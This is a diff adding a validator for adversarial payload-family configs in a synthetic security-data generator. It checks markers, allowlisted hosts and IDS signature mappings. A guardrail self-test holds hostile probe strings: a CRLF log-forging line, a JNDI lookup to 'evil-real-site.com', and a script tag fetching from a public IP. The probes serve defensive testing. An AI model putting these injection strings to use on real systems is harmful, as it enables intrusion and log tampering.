@@ -249,6 +249,109 @@ def _validate_secret_families(result: ValidationResult) -> None:
         )
 
 
+def _validate_payload_families(result: ValidationResult) -> None:
+    """Validate merged payload-family config used by the adversarial_payload event type."""
+    from evidenceforge.config.payload_families import load_payload_families
+    from evidenceforge.config.schemas import PayloadFamiliesConfig, validate_entry
+
+    try:
+        data = load_payload_families()
+    except Exception as e:
+        result.issues.append(Issue("ERROR", "payload_families.yaml", f"failed to load: {e}"))
+        return
+    err = validate_entry(data, PayloadFamiliesConfig, "payload_families.yaml")
+    if err:
+        result.issues.append(Issue("ERROR", "payload_families.yaml", err))
+        return
+
+    # Pre-flight: each family's value_template/examples must synthesize a value that
+    # passes the (inverted) safety guardrails — a poison marker on EVERY physical
+    # line and only allowlisted/canary hosts — caught here, not at generation time.
+    # Control bytes are intentionally permitted (they are the modeled weakness).
+    from evidenceforge.generation.activity.ids_signatures import signature_by_sid
+    from evidenceforge.generation.adversarial_payload import (
+        VALID_SURFACES,
+        AdversarialPayloadSafetyError,
+        check_payload_safety,
+        expand_family_variants,
+        render_for_surface,
+    )
+
+    for fam in data.get("families", []):
+        name = fam.get("name")
+        if not (
+            name
+            and (fam.get("value_template") or fam.get("value_templates") or fam.get("examples"))
+        ):
+            continue
+        # Check EVERY variant (each value_templates entry / every example / the single
+        # value_template) — one unsafe variant must not pass because a different one was
+        # sampled, then crash at generation time.
+        candidates = expand_family_variants(name, f"validate-config:{name}")
+        try:
+            for value in candidates:
+                check_payload_safety(value, family=name)
+                # Render every declared surface so a carrier-embedded non-allowlisted
+                # host — which is NOT part of the value and so is not covered by
+                # check_payload_safety — is caught here instead of at generation time.
+                for surface in fam.get("surfaces") or ():
+                    if surface in VALID_SURFACES:
+                        render_for_surface(value, surface, name, f"validate-config:{name}")
+        except AdversarialPayloadSafetyError as e:
+            result.issues.append(Issue("ERROR", "payload_families.yaml", f"family {name!r}: {e}"))
+
+        # On-wire IDS mapping integrity: a declared ids_sid must resolve to a real
+        # signature in the pool (a typo'd/orphaned SID would silently emit no alert and
+        # no ground-truth ids_alert), and its content token must match at least one
+        # variant (else the mapping is dead — the signature could never fire).
+        ids_sid = fam.get("ids_sid")
+        if ids_sid is not None:
+            if signature_by_sid(int(ids_sid)) is None:
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "payload_families.yaml",
+                        f"family {name!r} declares ids_sid {ids_sid} with no matching signature "
+                        "in ids_signatures.yaml",
+                    )
+                )
+            token = fam.get("ids_fires_on")
+            if token and not any(token.lower() in value.lower() for value in candidates):
+                result.issues.append(
+                    Issue(
+                        "WARNING",
+                        "payload_families.yaml",
+                        f"family {name!r} ids_fires_on {token!r} matches no value variant; "
+                        f"signature {ids_sid} can never fire",
+                    )
+                )
+
+    # Self-test: even though control bytes are allowed, the merged config must STILL
+    # reject a forged/split line that carries no marker and any non-reserved host. The
+    # marked portion is built from the config's OWN default_marker, so a marker so
+    # loose it also matches the benign forged line (the one looseness the schema does
+    # not catch) is exposed here — as are a too-loose canary/allowlist.
+    marker = str(data.get("default_marker", "EFORGE_TEST"))
+    for probe, why in (
+        (f"{marker} field=x\r\nforged: status=cleared actor=attacker", "an unmarked forged line"),
+        ("a plain log line with no poison marker at all", "a payload with no poison marker"),
+        (f"{marker} ${{jndi:ldap://evil-real-site.com/x}}", "a non-reserved JNDI host"),
+        (f"{marker} <script>fetch('https://8.8.8.8/x')</script>", "a non-reserved public IP host"),
+    ):
+        try:
+            check_payload_safety(probe, family=None)
+        except AdversarialPayloadSafetyError:
+            continue  # correctly rejected
+        result.issues.append(
+            Issue(
+                "ERROR",
+                "payload_families.yaml",
+                f"safety guardrails accept {why}; markers/canary_host/network_allowlist "
+                "are too permissive",
+            )
+        )
+
+
 def validate_config() -> ValidationResult:
     """Run validation checks across config files.
 
@@ -330,6 +433,11 @@ def validate_config() -> ValidationResult:
             "list_fields": {"families": "name"},
             "dict_fields": {"network_allowlist"},
             "string_list_fields": {"poison_markers", "vendor_fakes"},
+        },
+        "activity/payload_families.yaml": {
+            "list_fields": {"families": "name"},
+            "dict_fields": {"network_allowlist"},
+            "string_list_fields": {"markers"},
         },
         "activity/tls_issuers.yaml": {
             "list_fields": {"issuers": "name"},
@@ -2980,6 +3088,7 @@ def validate_config() -> ValidationResult:
                 )
 
     _validate_secret_families(result)
+    _validate_payload_families(result)
 
     seen_issues: set[tuple[str, str, str]] = set()
     deduped: list[Issue] = []
